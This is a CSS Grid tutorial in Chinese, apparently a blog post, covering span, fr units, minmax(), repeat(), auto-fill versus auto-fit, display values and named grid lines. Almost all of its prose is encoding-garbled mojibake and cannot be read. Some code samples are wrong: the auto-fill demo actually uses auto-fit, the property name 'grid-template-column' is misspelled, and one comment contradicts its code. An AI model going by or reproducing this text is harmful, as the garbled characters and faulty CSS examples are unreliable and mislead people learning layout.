è¶…å‡ºé¡¯æ€§æ ¼ç·šçš„ç¯„åœï¼ˆæˆ–æ˜¯æ²’æœ‰è¨­å®šé¡¯æ€§æ ¼ç·šï¼‰æ™‚ï¼Œæ‰æœƒç”¢ç”Ÿã€‚ éš±æ€§æ ¼ç·šçš„é è¨­å¯¬åº¦æ˜¯ç”± grid å…ƒç´ ä¾†æ’é–‹ã€‚ ä»¥åŠä¸€äº›é¡å¤–è£œå……ï¼š è¶…å‡ºé¡¯æ€§æ ¼ç·š grid ç¯„åœçš„å…ƒç´ ï¼Œæœƒæ ¹æ“š grid-auto-flow çš„è¨­å®šï¼Œä¾†æ±ºå®šè¦æ”¾åˆ°ä¸‹ä¸€åˆ— or ä¸‹ä¸€æ¬„ã€‚ grid-auto-columns / rowså¯ä»¥åƒgrid-templates-columns / rowsä¸€æ¨£è¨­å®šå¤šå€‹å€¼ã€‚ æœ€å¾Œé™„ä¸Š Codepen çµ¦å¤§å®¶ç·´ç¿’ ï¼š See the Pen grid-explicit &amp; implicit by jim (@jubeatt) on CodePen. å¦‚æœä»¥ä¸Šé€™äº›æ¦‚å¿µä½ éƒ½ç†è§£çš„è©±ï¼Œæ¥è‘—å°±èƒ½é–‹å§‹å­¸ç¿’ grid çš„ç›¸é—œå±¬æ€§å›‰ï¼ gird å±¬æ€§åˆ—è¡¨ display grid-template-rows &amp; grid-template-columns grid-row &amp; grid-column grid-auto-flow grid-auto-rows &amp; grid-auto-columns grid-area &amp; grid-template-areas column-gap &amp; row-gap justify-items align-items place-items justify-content align-content place-content justify-self align-self place-self order grid çš„ç‰¹åˆ¥å–®ä½èˆ‡å‡½å¼grid ä¸­æœ‰ä¸€äº›ç‰¹æ®Šçš„å–®ä½æˆ–å‡½å¼ï¼Œèƒ½å¤ è®“ grid æ’°å¯«èµ·ä¾†æ›´æ–¹ä¾¿ï¼Œæˆ–æ˜¯ç™¼æ®æ›´å¼·å¤§çš„åŠŸèƒ½ã€‚ span é—œéµå­—å‰é¢æœ‰èªªéï¼Œæˆ‘å€‘èƒ½é€égrid-row, grid-columnä¾†è¨­å®š grid å…ƒç´ çš„ä½ç½®ã€‚ ä½†æ˜¯ç•¶æ ¼ç·šæ•¸é‡æ¯”è¼ƒå¤šçš„æ™‚å€™ï¼Œé€šå¸¸å°±å¾—ä¸€å€‹ä¸€å€‹æ•¸ï¼Œé€™æ¨£å¾ˆä¸æ–¹ä¾¿ã€‚ æ‰€ä»¥ grid ä¹Ÿæä¾›äº†spané€™å€‹é—œéµå­—ï¼Œè®“ä½ å¯ä»¥ç›´æ¥æŒ‡å®šæ¬„ / åˆ—æ•¸ï¼Œè€Œä¸ç”¨å†æ•¸æ ¼ç·šã€‚ ç”¨æ³•ï¼š å¦‚æœæ˜¯åœ¨startä¸Šè¨­å®šçš„è©±ï¼Œå°±ä»£è¡¨å¾endå¾€å‰æ•¸éå»ã€‚ å¦‚æœæ˜¯åœ¨endä¸Šè¨­å®šçš„è©±ï¼Œå°±ä»£è¡¨å¾startå¾€å¾Œæ•¸éå»ã€‚ 12345678910111213.item--yellow { // end = æ ¼ç·š(-1) // start = å¾endæ•¸éä¾†çš„ç¬¬äºŒæ¬„ grid-column: span 2 / -1;}.item--blue { // start = æ ¼ç·š(1) // end = å¾startè™•æ•¸éä¾†çš„ç¬¬äºŒæ¬„ grid-column: 1 / span 2; // æˆ–æ˜¯é€™æ¨£å¯«ä¹Ÿè¡Œ grid-column-start: span 2;} ğŸš€ Codepenï¼šé»é€™è£¡ fr å–®ä½fr ç‚ºfraction(åˆ†æ•¸)çš„ç¸®å¯«ã€‚ ğŸ’¡ è¨» 1ï¼šfr çš„æœ€å°å€¼ç‚ºgridå…ƒç´ ä¸­çš„å…§å®¹å¯¬åº¦ï¼ˆä¸æœƒç¸®åˆ°æ¯”å…§å®¹é‚„è¦å°ï¼‰ï¼Œä½ ä¹Ÿèƒ½æƒ³æˆ 1fr = (auto, 1fr), min=auto, max=1frã€‚ ğŸ’¡ è¨» 2ï¼šä¸çŸ¥é“ä½ æœ‰æ²’æœ‰èƒŒéé€™äº›å–®å­—ï¼šfracture(æ–·è£‚), fragile(æ˜“ç¢çš„), fragment(ç¢ç‰‡)ï¼Œfrag æ˜¯ã€Œç ´å£ã€æ–·ã€æŠ˜ã€çš„å­—é¦–ï¼Œæ‰€ä»¥å¸¶æœ‰é€™å€‹å­—é¦–çš„å–®å­—æ„æ€éƒ½æœƒå·®ä¸å¤šï¼Œfraction ä¹Ÿæ˜¯å…¶ä¸­ä¹‹ä¸€ï¼Œæ‰€ä»¥èƒ½åˆ©ç”¨é€™å€‹å­—é¦–ä¾†å¹«åŠ©è¨˜æ†¶ã€‚ fr è·Ÿ flex ä¸­çš„flex-growæœ‰é»åƒï¼Œèƒ½å¤ åˆ©ç”¨å‰©é¤˜ç©ºé–“ä¾†åˆ†é…çµ¦å…ƒç´ ï¼Œæˆ‘å€‘ç›´æ¥çœ‹ä¾‹å­ï¼š 123456.box { width: 960px; display: grid; grid-template-columns: 100px 1fr 1fr 2fr 2fr 3fr; grid-gap: 20px;} ğŸš€ Codepenï¼šé»é€™è£¡ ä½¿ç”¨ fr çš„æ™‚å€™å¿…é ˆè¦çŸ¥é“ï¼š ç¸½ç©ºé–“æœ‰å¤šå¤§ å“ªäº›æ±è¥¿ä½”æ“šäº†å¤šå°‘çš„å›ºå®šç©ºé–“ è¨ˆç®—å‡ºå‰©é¤˜ç©ºé–“ frçš„ç¸½åˆ†æ•¸å€¼ æ¯å€‹å€å¡Šçš„frå€¼ æ‰€ä»¥ä¸Šé¢çš„ä¾‹å­èƒ½åˆ†æå‡ºï¼š ç¸½ç©ºé–“ï¼š960px å›ºå®šç©ºé–“ï¼š100pxçš„é–“è·(5å€‹20px)ï¼Œ100pxçš„æ–¹å¡Š å‰©é¤˜ç©ºé–“ï¼š960-100-100 = 760px fr çš„ç¸½åˆ†æ•¸å€¼ï¼š1+1+2+2+3 = 9 æ¯å€‹å€å¡Šçš„ fr å€¼ï¼š 1/9, 1/9, 2/9, 2/9, 3/9 é€™äº›æ±è¥¿éƒ½æœ‰ä¹‹å¾Œï¼Œä½ å°±èƒ½åˆ©ç”¨å‰©é¤˜ç©ºé–“ x frå€¼ä¾†è¨ˆç®—å‡ºæ¯å€‹æ–¹å¡Šçš„å¯¦éš›å¤§å°æ˜¯å¤šå°‘ã€‚ ä½¿ç”¨ fr çš„å¥½è™• å‡è¨­æƒ³è®“æ¯å€‹å€å¡Šå¤§å°ä¸€æ¨£ï¼Œä¸éœ€è¦åšä»»ä½•è¨ˆç®—ï¼Œåªè¦å…¨éƒ¨è¨­ç‚º 1fr å³å¯ã€‚ æ–°å¢æ¬„/åˆ—æ™‚ï¼Œä¸ç”¨åƒä½¿ç”¨ %ä¸€æ¨£ï¼Œå¾—å…¨éƒ¨é‡æ–°è¨ˆç®—ã€‚ ä¿®æ”¹é–“è·æ™‚ï¼Œä¸ç”¨åƒä½¿ç”¨ % ä¸€æ¨£ï¼Œå¾—å…¨éƒ¨é‡æ–°è¨ˆç®—ã€‚ ä¿®æ”¹æŸå€‹æ¬„/åˆ—çš„å¯¬åº¦æ™‚ï¼Œä¸ç”¨åƒä½¿ç”¨ % ä¸€æ¨£ï¼Œå¾—å…¨éƒ¨é‡æ–°è¨ˆç®—ã€‚ minmax()ç”¨é€”ï¼šè¨­å®šæ¬„èˆ‡åˆ—çš„æœ€å¤§æœ€å°å€¼ å°±è·Ÿmin-widthå’Œmax-widthçš„æ¦‚å¿µæ˜¯ä¸€æ¨£çš„ï¼Œä½ å¯ä»¥æŒ‡å®šæ¯å€‹æ¬„åˆ—çš„æœ€å¤§èˆ‡æœ€å°å¯¬åº¦ã€‚ 123456&lt;div class=\"box\"&gt; &lt;div class=\"item--yellow\"&gt;&lt;/div&gt; &lt;div class=\"item--blue\"&gt;&lt;/div&gt; &lt;div class=\"item--green\"&gt;&lt;/div&gt; &lt;div class=\"item--pink\"&gt;&lt;/div&gt;&lt;/div&gt; 123456789101112.box { // å»ºç«‹äº”æ¬„ // æ¯å€‹æ¬„çš„æœ€å¤§å¯¬åº¦ 100px // æ¯å€‹æ¬„çš„æœ€å°å¯¬åº¦ 50px grid-template-columns: minmax(50px, 100px) minmax(50px, 100px) minmax(50px, 100px) minmax(50px, 100px); // å»ºç«‹ä¸€åˆ— // æ¯å€‹åˆ—çš„æœ€å¤§å¯¬åº¦ 100px // æ¯å€‹åˆ—çš„æœ€å°å¯¬åº¦ 50px grid-template-rows: minmax(50px, 100px);} ğŸš€ Codepenï¼šé»é€™è£¡ ğŸ’¡ ç¾åœ¨æ–¹å¡Šæœ€å°åªèƒ½ç¸®åˆ° 50pxï¼Œæœ€å¤§åªèƒ½æ“´åˆ° 100pxã€‚ repeat()ç”¨é€”ï¼šæŒ‡å®šæ¬¡æ•¸ï¼ŒæŠŠè¦é‡è¤‡çš„å€¼å¯«é€²å»ã€‚ å‡è¨­æˆ‘æƒ³è¦å»ºç«‹ 100px, 150px é€™æ¨£çš„æ¬„ 5 æ¬¡ï¼Œå°±é€™æ¨£å­å¯«ï¼š 1234.box { // é‡è¤‡å»ºç«‹ 50px 100pxçš„æ¬„ \"5æ¬¡\" grid-template-columns: repeat(5, 100px 150px);} ğŸš€ Codepenï¼šé»é€™è£¡ auto-fill &amp; auto-fitå…©å€‹éƒ½å¾—æ­é…repeat()ä¸€èµ·ä½¿ç”¨ã€‚ ç•¶ä½ ä¸æƒ³æ˜ç¢ºæŒ‡å®šè¦æœ‰å¹¾æ¬„å¹¾åˆ—ï¼Œä¹Ÿä¸ç¢ºå®š grid å…ƒç´ çš„æ•¸é‡æ™‚ï¼Œé€™å…©å€‹å±¬æ€§æœƒå¾ˆæœ‰å¹«åŠ©ã€‚ è·Ÿéš±æ€§æ ¼ç·šæœ‰ä¸€é»é¡ä¼¼ï¼Œä½†éš±æ€§æ ¼ç·šçš„å•é¡Œæ˜¯ï¼š grid å…ƒç´ åªæœƒå¾€å–®ä¸€æ–¹å‘æ’åˆ—ï¼ˆæ¬„æˆ–åˆ—ï¼‰ å¿…é ˆè¦æœ‰ grid å…ƒç´ å­˜åœ¨ï¼Œæ‰æœƒç”¢ç”Ÿç¶²æ ¼ã€‚ æ¯ç•¶æ”¾å…¥æ–°çš„ grid å…ƒç´ ï¼Œå°±æœƒä¸€ç›´ç”¢ç”Ÿæ–°çš„ç¶²æ ¼ï¼Œç„¡æ³•é™åˆ¶åœ¨ä¸€å€‹ç¯„åœå…§ã€‚ auto-fill ç”¨é€”ï¼šæ ¹æ“šè¨­å®šçš„å°ºå¯¸ï¼Œç›¡å¯èƒ½åœ¨ grid ç©ºé–“ä¸­å»ºç«‹æœ€å¤šçš„æ¬„æˆ–åˆ—ã€‚ ğŸ’¡ è¨» 1ï¼šæ—¢ä½¿æ²’æœ‰æ”¾å…¥ grid å…ƒç´ ï¼Œè©²ç¶²æ ¼ä½”æ“šçš„ç©ºé–“ä¾ç„¶æœƒå­˜åœ¨ã€‚ğŸ’¡ è¨» 2ï¼šæœƒéš¨è‘—å®¹å™¨å¯¬åº¦ä¾†å‹•æ…‹æ›´æ–°ç¶²æ ¼çš„æ¬„æ•¸ã€‚ 1234567&lt;div class=\"box\"&gt; &lt;div class=\"item--yellow\"&gt;&lt;/div&gt; &lt;div class=\"item--blue\"&gt;&lt;/div&gt; &lt;div class=\"item--green\"&gt;&lt;/div&gt; &lt;div class=\"item--pink\"&gt;&lt;/div&gt; &lt;div class=\"item--purple\"&gt;&lt;/div&gt;&lt;/div&gt; 1234567891011121314.box { // gridç©ºé–“çš„å¯¬åº¦èˆ‡é«˜åº¦ width: 70%; max-width: 760px; height: 250px; // å»ºç«‹gridç¶²æ ¼ display: grid; // ç”¢ç”Ÿ100pxçš„æ¬„ï¼Œç›´åˆ°å¡ä¸ä¸‹gridç©ºé–“ç‚ºæ­¢ã€‚ grid-template-columns: repeat(auto-fill, 100px); // ç”¢ç”Ÿ100pxçš„åˆ—ï¼Œç›´åˆ°å¡ä¸ä¸‹gridç©ºé–“ç‚ºæ­¢ã€‚ grid-template-rows: repeat(auto-fill, 100px);} ğŸš€ Codepenï¼šé»é€™è£¡ ä½ å¯ä»¥çœ‹åˆ°ï¼š grid ç©ºé–“çš„å¯¬åº¦ç‚º 760pxï¼Œæ¯æ¬„ 100pxï¼Œæœ€å¤šå¯ä»¥å»ºç«‹ 7 æ¬„ã€‚ grid ç©ºé–“çš„é«˜åº¦ç‚º 250pxï¼Œæ¯åˆ— 100pxï¼Œæœ€å¤šå¯ä»¥å»ºç«‹ 2 åˆ—ã€‚ grid ç©ºé–“ä¸­åªæœ‰æ”¾å…¥ 5 å€‹ grid å…ƒç´ ï¼Œä½†ç©ºçš„ç¶²æ ¼ä¾ç„¶å­˜åœ¨ã€‚ ä¸¦ä¸”èƒ½å¤ éš¨è‘— grid ç©ºé–“çš„ç¯„åœå‹•æ…‹æ›´æ–°ç¶²æ ¼ï¼š ğŸš€ Codepenï¼šé»é€™è£¡ auto-fit ç”¨é€”ï¼šæ ¹æ“šè¨­å®šçš„å°ºå¯¸ï¼Œç›¡å¯èƒ½åœ¨ grid ç©ºé–“ä¸­å»ºç«‹æœ€å¤šçš„æ¬„æˆ–åˆ—ã€‚ ğŸ’¡ è¨» 1ï¼šè‹¥æ˜¯æ²’æœ‰æ”¾å…¥ grid å…ƒç´ ï¼Œè©²ç¶²æ ¼ä½”æ“šçš„ç©ºé–“æœƒè¢«æŠ˜ç–Šã€‚ğŸ’¡ è¨» 2ï¼šæœƒéš¨è‘—å®¹å™¨å¯¬åº¦ä¾†å‹•æ…‹æ›´æ–°ç¶²æ ¼çš„æ¬„æ•¸ã€‚ 1234567&lt;div class=\"box\"&gt; &lt;div class=\"item--yellow\"&gt;&lt;/div&gt; &lt;div class=\"item--blue\"&gt;&lt;/div&gt; &lt;div class=\"item--green\"&gt;&lt;/div&gt; &lt;div class=\"item--pink\"&gt;&lt;/div&gt; &lt;div class=\"item--purple\"&gt;&lt;/div&gt;&lt;/div&gt; 1234567891011121314.box { // gridç©ºé–“çš„å¯¬åº¦èˆ‡é«˜åº¦ width: 70%; max-width: 760px; height: 250px; // å»ºç«‹gridç¶²æ ¼ display: grid; // ç”¢ç”Ÿ100pxçš„æ¬„ï¼Œç›´åˆ°å¡ä¸ä¸‹gridç©ºé–“ç‚ºæ­¢ã€‚ grid-template-columns: repeat(auto-fit, 100px); // ç”¢ç”Ÿ100pxçš„åˆ—ï¼Œç›´åˆ°å¡ä¸ä¸‹gridç©ºé–“ç‚ºæ­¢ã€‚ grid-template-rows: repeat(auto-fit, 100px);} ğŸš€ Codepenï¼šé»é€™è£¡ ä½ å¯ä»¥çœ‹åˆ°ï¼š grid ç©ºé–“çš„å¯¬åº¦ç‚º 760pxï¼Œæ¯æ¬„ 100pxï¼Œæœ€å¤šå¯ä»¥å»ºç«‹ 7 æ¬„ (æ³¨æ„æ ¼ç·šç·¨è™Ÿ)ã€‚ grid ç©ºé–“çš„é«˜åº¦ç‚º 250pxï¼Œæ¯åˆ— 100pxï¼Œæœ€å¤šå¯ä»¥å»ºç«‹ 2 åˆ— (æ³¨æ„æ ¼ç·šç·¨è™Ÿ)ã€‚ grid ç©ºé–“ä¸­åªæœ‰æ”¾å…¥ 5 å€‹ grid å…ƒç´ ï¼Œä½†ç©ºçš„ç¶²æ ¼æœƒè¢«æŠ˜ç–Šã€‚ ä¸¦ä¸”èƒ½å¤ éš¨è‘— grid ç©ºé–“çš„ç¯„åœå‹•æ…‹æ›´æ–°ç¶²æ ¼ï¼š ğŸš€ Codepenï¼šé»é€™è£¡ âš  auto-fill &amp; auto-fit ä½¿ç”¨æ™‚çš„å°é™·é˜± å›é¡§ä¸€ä¸‹å‰›å‰›æåˆ°é€™å…©è€…çš„å·®ç•°ï¼š fitï¼šç©ºçš„ç¶²æ ¼ç©ºé–“æœƒè¢«æŠ˜ç–Šæˆ 0px fillï¼šç©ºç¶²æ ¼æ ¼ç©ºé–“æœƒä»ç„¶ç¶­æŒè¨­å®šçš„ç©ºé–“ é€™è·Ÿæˆ‘å€‘æ¥ä¸‹ä¾†è¦è«‡çš„æ±è¥¿æœ‰å¾ˆå¤§çš„é—œä¿‚ï¼Œæ‰€ä»¥è«‹å„ä½å‹™å¿…è¨˜å¾—é€™å…©å€‹å·®ç•°ã€‚ æ¥è‘—ä¾†çœ‹å€‹ä¾‹å­ï¼š 1234567891011&lt;div class=\"wrap\"&gt; &lt;div class=\"box--fit\"&gt; &lt;div class=\"item--yellow\"&gt;&lt;/div&gt; &lt;div class=\"item--blue\"&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class=\"box--fill\"&gt; &lt;div class=\"item--yellow\"&gt;&lt;/div&gt; &lt;div class=\"item--blue\"&gt;&lt;/div&gt; &lt;/div&gt;&lt;/div&gt; 12345678910111213141516171819.box--fit { // gridç©ºé–“çš„å¤§å°ç‚º760px width: 760px; // ç›¡å¯èƒ½å¡«æ»¿gridç©ºé–“ // æ¯æ¬„çš„æœ€å°å¯¬ 200px // è‹¥å¯¬æ¯” 200pxå¤§ï¼Œå‰‡å¥—ç”¨1fr grid-template-column: repeat(auto-fit, minmax(200px, 1fr));}.box--fill { // gridç©ºé–“çš„å¤§å°ç‚º760px width: 760px; // ç›¡å¯èƒ½å¡«æ»¿gridç©ºé–“ // æ¯æ¬„çš„æœ€å°å¯¬ 200px // è‹¥å¯¬æ¯” 200pxå¤§ï¼Œå‰‡å¥—ç”¨1fr grid-template-column: repeat(auto-fit, minmax(200px, 1fr));} çµæœå¦‚ä¸‹ï¼š ğŸš€ Codepenï¼šé»é€™è£¡ é€™è£¡æƒ³å•çš„æ˜¯ï¼ŒåŒæ¨£éƒ½æ˜¯å¡«æ»¿ï¼Œä¹ŸåŒæ¨£éƒ½æ”¾å…¥å…©å€‹å…ƒç´ ï¼Œä½ èƒ½è§£é‡‹å‡ºç‚ºä»€éº¼æœƒé€™æ¨£çš„å·®ç•°å—ï¼Ÿ ä½ å¯ä»¥å…ˆè‡ªå·±æ€è€ƒçœ‹çœ‹ï¼Œå†ä¾†çœ‹ä¸‹é¢çš„è§£é‡‹ã€‚ å¦‚æœä¸å¤ªæ¸…æ¥šçš„è©±ï¼Œåƒè€ƒé€™å¼µåœ–ï¼š æ‰€ä»¥æœ€å¾Œç•™çµ¦å„ä½ä¸€å€‹å•é¡Œï¼Œçœ‹çœ‹å„ä½æ˜¯å¦çœŸçš„æœ‰ç†è§£é€™å…©è€…çš„å·®ç•°ã€‚ å‡è¨­ç¾åœ¨çš„éœ€æ±‚æ˜¯å¸Œæœ›ä¸ç®¡æ”¾å…¥å¤šå°‘å…ƒç´ ï¼Œå…ƒç´ éƒ½è¦æŠŠæ•´å€‹gridç©ºé–“å¡«æ»¿ï¼Œè«‹å•è©²ç”¨auto-fité‚„æ˜¯auto-fillå‘¢ï¼Ÿ displayç”¨é€”ï¼šå»ºç«‹ grid ç¶²æ ¼ æˆ‘çŸ¥é“ä»‹ç´¹é€™å€‹å±¬æ€§å¥½åƒæœ‰é»å¤šé¤˜ï¼Œä¸éä½ çŸ¥é“å…¶å¯¦å®ƒæœ‰å…©å€‹å€¼å¯ä»¥è¨­å®šå—ï¼Ÿ 12345678910&lt;div class=\"container\"&gt; &lt;!-- grid-box(1) --&gt; &lt;div class=\"box\"&gt; &lt;div class=\"box__item box__item--yellow\"&gt;&lt;/div&gt; &lt;/div&gt; &lt;!-- grid-box(2) --&gt; &lt;div class=\"box\"&gt; &lt;div class=\"box__item box__item--yellow\"&gt;&lt;/div&gt; &lt;/div&gt;&lt;/div&gt; 123456.box { // å»ºç«‹gridç©ºé–“ï¼Œä¸¦å°‡gridç©ºé–“è‡ªèº«è¨­ç‚ºinlineå…ƒç´  display: inline-grid; // å»ºç«‹gridç©ºé–“ï¼Œä¸¦å°‡gridç©ºé–“è‡ªèº«è¨­ç‚ºblockå…ƒç´  display: grid;} ğŸš€ Codepenï¼šé»é€™è£¡ grid-template-rows &amp; grid-template-columnsç”¨é€”ï¼šè¨­å®šé¡¯æ€§æ ¼ç·š(åˆ—)çš„å¯¬åº¦ &amp; è¨­å®šé¡¯æ€§æ ¼ç·š(æ¬„)çš„å¯¬åº¦ è®“æˆ‘å€‘ä¾†å»ºç«‹ä¸€å€‹ 4 æ¬„ 2 åˆ—çš„ grid ç¶²æ ¼ã€‚ å»ºç«‹åŸºæœ¬çš„ HTMLï¼š 123456789101112&lt;div class=\"box\"&gt; &lt;!-- ç¬¬ä¸€åˆ— --&gt; &lt;div class=\"item--yellow\"&gt;&lt;/div&gt; &lt;div class=\"item--blue\"&gt;&lt;/div&gt; &lt;div class=\"item--green\"&gt;&lt;/div&gt; &lt;div class=\"item--pink\"&gt;&lt;/div&gt; &lt;!-- ç¬¬äºŒåˆ— --&gt; &lt;div class=\"item--pink\"&gt;&lt;/div&gt; &lt;div class=\"item--green\"&gt;&lt;/div&gt; &lt;div class=\"item--blue\"&gt;&lt;/div&gt; &lt;div class=\"item--yellow\"&gt;&lt;/div&gt;&lt;/div&gt; å»ºç«‹ grid ç¶²æ ¼ä»¥åŠè¨­å®šï¼š 1234567.box { // è¨­å®šæ¬„ï¼ˆ4å€‹æ¬„ï¼Œå„100pxï¼‰ grid-template-columns: 100px 100px 100px 100px; // è¨­å®šåˆ—ï¼ˆ2å€‹åˆ—ï¼Œå„100pxï¼‰ grid-template-rows: 100px 100px;} ğŸš€ Codepenï¼šé»é€™è£¡ å¦‚æœè¦ºå¾—ä¸Šé¢é€™æ¨£å¯«æœ‰é»éº»ç…©çš„è©±ï¼Œä½ ä¹Ÿå¯ä»¥æ­é…repeat()ä¾†ä½¿ç”¨ï¼š 12345678910111213141516.box { // ç¬¬ä¸€ç¨® grid-template-columns: repeat(4, 100px); // ç­‰æ–¼ä»¥ä¸‹ grid-template-columns: 100px 100px 100px 100px; // ç¬¬äºŒç¨® grid-template-columns: repeat(2, 100px) 200px; // ç­‰æ–¼ä»¥ä¸‹ grid-template-columns: 100px 100px 200px; // ç¬¬ä¸‰ç¨® grid-template-columns: repeat(2, 100px) 20%; // ç­‰æ–¼ä»¥ä¸‹ grid-template-columns: 100px 100px 20%;} è‡ªè¨‚ç¾©æ ¼ç·šåç¨±ä½¿ç”¨grid-template-columns / rowsçš„æ™‚å€™ï¼Œæ˜¯å¯ä»¥è‡ªå®šç¾©æ ¼ç·šçš„åå­—çš„ã€‚ğŸ’¡ åªæœ‰ grid-template å¯ä»¥ï¼Œgrid-auto ä¸è¡Œã€‚ 123456789101112131415.box { display: grid; // æ¬„ grid-template-columns: [Cline-start]100px [Cline-2]100px [Cline-3]100px [Cline-4]100px [Cline-end]; // åˆ— grid-template-rows: [Rline-start]100px [Rline-2]100px [Rline-end];} ç•«æˆåœ–çš„è©±æœƒé•·çš„åƒé€™æ¨£ï¼š æ¥è‘— grid å…ƒç´ å°±èƒ½æ‹¿æˆ‘å€‘å–çš„åå­—ä¾†è¨­å®šã€‚ 123.yellow { grid-row-start: Rline-2;} ğŸš€ Codepenï¼šé»é€™è£¡ è‡ªå®šç¾©æ ¼ç·šåç¨±æ™‚çš„æ³¨æ„äº‹é …ğŸ‰ è¨»ï¼šé€™å€‹å•é¡Œæ˜¯ä¸€ä½è‡‰æ›¸ä¸­çš„ç¤¾å‹å¹«åŠ©æˆ‘è§£é–‹çš„ï¼Œéå¸¸è¬è¬ä½ å¹«åŠ©æˆ‘è§£æƒ‘ã€‚ é€™é‚Šè¦ç‰¹åˆ¥æ³¨æ„ä¸€ä»¶äº‹ï¼Œç•¶ä½ æƒ³å¹«æ ¼ç·šå–åç¨±æ™‚ï¼Œè«‹ç›¡é‡é¿å…åœ¨åç¨±ä¸­ä½¿ç”¨-startèˆ‡-endé€™å…©å€‹é—œéµå­—ã€‚ è®“æˆ‘å€‘ç›´æ¥ç”¨ä¾‹å­ä¾†åšè§£èªªï¼š 123456&lt;div class=\"box\"&gt; &lt;div class=\"item--yellow\"&gt;&lt;/div&gt; &lt;div class=\"item--blue\"&gt;&lt;/div&gt; &lt;div class=\"item--green\"&gt;&lt;/div&gt; &lt;div class=\"item--pink\"&gt;&lt;/div&gt;&lt;/div&gt; 123456789101112131415.box { display: grid; // æ¬„ grid-template-columns: [Cline1-start]100px [Cline2-start]100px [Cline3-start]100px [Cline4-start]100px [Cline5-start]; // åˆ— grid-template-rows: [Rline1-end]100px [Rline2-end]100px [Rline3-end];} å‡è¨­åœ¨æ²’åšä»»ä½•è¨­å®šæ™‚çš„ç¶²æ ¼èˆ‡å…ƒç´ é•·é€™æ¨£ï¼š ç¾åœ¨æˆ‘å€‘å°é»ƒè‰²æ–¹å¡Šåšä»¥ä¸‹è¨­å®šï¼š 1234.item--yellow { // â†“ å°‡èµ·å§‹é»è¨­åœ¨Cline3é€™æ¢æ ¼ç·šä¸Š grid-column-start: Cline3;} ğŸš€ Codepenï¼šé»é€™è£¡ ä½ èƒ½çœ‹åˆ°é»ƒè‰²æ–¹å¡Šå±…ç„¶è‡ªå‹•ç§»å‹•åˆ°äº†Cline3-starté€™æ¢æ ¼ç·šä¸Šçš„ä½ç½®ã€‚ æˆ‘å€‹äººæŠŠé€™å€‹æ©Ÿåˆ¶çœ‹ä½œæ˜¯ä¸€ç¨®å‚™ç”¨æ©Ÿåˆ¶ï¼Œé€™å€‹å‚™ç”¨æ©Ÿåˆ¶æœƒåœ¨ç•¶ä½ æŒ‡å®šä¸€æ¢ä¸å­˜åœ¨çš„æ ¼ç·šåç¨±æ™‚è§¸ç™¼ã€‚ åœ¨æˆ‘å€‘å‰›å‰›ä½¿ç”¨æŒ‡å®šCline3çš„æ™‚å€™ï¼Œgrid-column-startæœƒè©¦è‘—å»æ‰¾åå­—å«åšCline3çš„é€™æ¢æ ¼ç·šï¼Œä½†å®ƒç™¼ç¾ä¸¦æ²’æœ‰å«åšCline3çš„æ ¼ç·šï¼Œæ‰€ä»¥å®ƒæœƒè‡ªå‹•å¹«ä½ åœ¨Cline3çš„å¾Œé¢åŠ ä¸Š-starté€™å€‹é—œéµå­—ã€‚ æ‰€ä»¥ç•¶åŠ å…¥é€™å€‹é—œéµå­—å¾Œï¼Œgrid-column-startæœƒå†æ¬¡å°‹æ‰¾æ˜¯å¦æœ‰Cline3-starté€™æ¢æ ¼ç·šï¼Œè€Œé€™æ™‚å°±èƒ½æ­£ç¢ºæ‰¾åˆ°æˆ‘å€‘åœ¨ä¸€é–‹å§‹å–åç‚ºCline3-startçš„é‚£æ¢æ ¼ç·šã€‚ è€Œé€™ä¹Ÿå°±æ˜¯ç‚ºä»€éº¼æˆ‘å€‘æ˜æ˜æ²’æœ‰æŒ‡å®šæ­£ç¢ºçš„åç¨±ä¹Ÿèƒ½å¤ æ‰¾åˆ°æ ¼ç·šçš„ä½ç½®ã€‚ æ‰€ä»¥å³ä¾¿ä½ ç¾åœ¨æŠŠæ ¼ç·šåç¨±å–æˆé€™æ¨£ï¼š 12345678910111213141516.box { display: grid; // æ¬„ grid-template-columns: [Cline1-start]100px [Cline2-start]100px // â†“ æŠŠåç¨±æ”¹æˆé€™æ¨£ [Cline3-start-start]100px [Cline4-start]100px [Cline5-start]; // åˆ— grid-template-rows: [Rline1-end]100px [Rline2-end]100px [Rline3-end];} 1234.item--yellow { // â†“ å°‡èµ·å§‹é»è¨­åœ¨Cline3-starté€™æ¢æ ¼ç·šä¸Š grid-column-start: Cline3-start;} æœ€å¾Œçš„çµæœä¹Ÿæ˜¯æœƒè·Ÿå‰›å‰›æ˜¯ä¸€æ¨£çš„ã€‚ï¼ˆæ‰¾ä¸åˆ° Cline3-start â†’ æ”¹æ‰¾ Cline3-start-startï¼‰ ğŸš€ Codepenï¼šé»é€™è£¡ ä½†å¦‚æœä½ ç¾åœ¨åˆæ”¹æˆé€™æ¨£ï¼š 12345678910111213141516.box { display: grid; // æ¬„ grid-template-columns: [Cline1-start]100px [Cline2-start]100px // â†“ ä¸ä½¿ç”¨-starté—œéµå­— [Cline3-abcde]100px [Cline4-start]100px [Cline5-start]; // åˆ— grid-template-rows: [Rline1-end]100px [Rline2-end]100px [Rline3-end];} 123.item--yellow { grid-column-start: Cline3;} ğŸš€ Codepenï¼šé»é€™è£¡ æ­¤æ™‚é»ƒè‰²æ–¹å¡Šå°±æ¶ˆå¤±äº†ï¼Œç‚ºä»€éº¼ï¼Ÿ å¥—ç”¨å‰›å‰›çš„æ©Ÿåˆ¶ï¼Œç•¶Cline3æ‰¾ä¸åˆ°æ™‚ï¼Œå®ƒæœƒæ”¹æ‰¾Cline3-starté€™æ¢æ ¼ç·šï¼Œä½†ç”±æ–¼æˆ‘å€‘å–çš„åç¨±ç‚ºCline3-abcdeï¼Œæ‰€ä»¥å³ä¾¿å®ƒæ¡å–äº†é€™å€‹å‚™ç”¨æ©Ÿåˆ¶ï¼Œå®ƒä¹Ÿç„¡æ³•æ‰¾åˆ°æ­£ç¢ºçš„ä½ç½®ï¼Œå› æ­¤é»ƒè‰²æ–¹å¡Šæ‰æœƒæ¶ˆå¤±ã€‚ è‡³æ–¼-endåˆæœƒç™¼ç”Ÿåœ¨ä»€éº¼æƒ…æ³å‘¢ï¼Ÿ å…¶å¯¦è·Ÿå‰›å‰›éƒ½æ˜¯ä¸€æ¨£çš„é“ç†ï¼Œåªä¸é-endæ˜¯åœ¨ä½¿ç”¨grid-column-endä¾†åšè¨­å®šçš„æ™‚å€™ç™¼ç”Ÿã€‚ æ‰€ä»¥ä¸‹æ¬¡å†å¹«æ ¼ç·šå‘½åçš„æ™‚å€™ï¼Œå»ºè­°æœ€å¥½é¿å…ä½¿ç”¨-startï¼Œ-endé€™å…©å€‹é—œéµå­—ã€‚ 